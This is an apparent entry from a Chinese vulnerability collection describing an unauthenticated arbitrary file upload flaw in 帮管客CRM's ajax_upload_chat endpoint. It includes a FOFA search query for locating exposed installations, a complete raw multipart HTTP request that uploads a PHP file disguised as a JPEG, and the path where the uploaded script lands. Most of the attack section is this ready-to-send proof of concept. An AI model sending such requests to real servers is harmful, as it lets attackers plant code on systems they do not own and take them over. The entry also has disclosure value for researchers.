---

source: "wy876 漏洞文库"
---

# 帮管客CRM ajax_upload_chat存在任意文件上传漏洞

# 一、漏洞简介
帮管客CRM是一款集客户档案、销售记录、业务往来等功能于一体的客户管理系统。帮管客CRM客户管理系统，客户管理，从未如此简单，一个平台满足企业全方位的销售跟进、智能化服务管理、高效的沟通协同、图表化.帮管客CRM ajax_upload_chat、ajax_upload等接口处存在文件上传漏洞，未经授权的攻击者可利用该漏洞获取服务器权限。

# 二、影响版本
+ 帮管客CRM

# 三、资产测绘
+ fofa`app="帮管客-CRM"`
+ 特征


# 四、漏洞复现
```plain
POST /index.php/upload/ajax_upload_chat HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryv1WbOn5o

------WebKitFormBoundaryv1WbOn5o
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php
phpinfo();unlink(__FILE__);
------WebKitFormBoundaryv1WbOn5o--
```


上传文件位置

```plain
//data//uploads//uploads_chat//202401//202401311645381ARfoVrTb.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zv9kvh2812magvgl>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
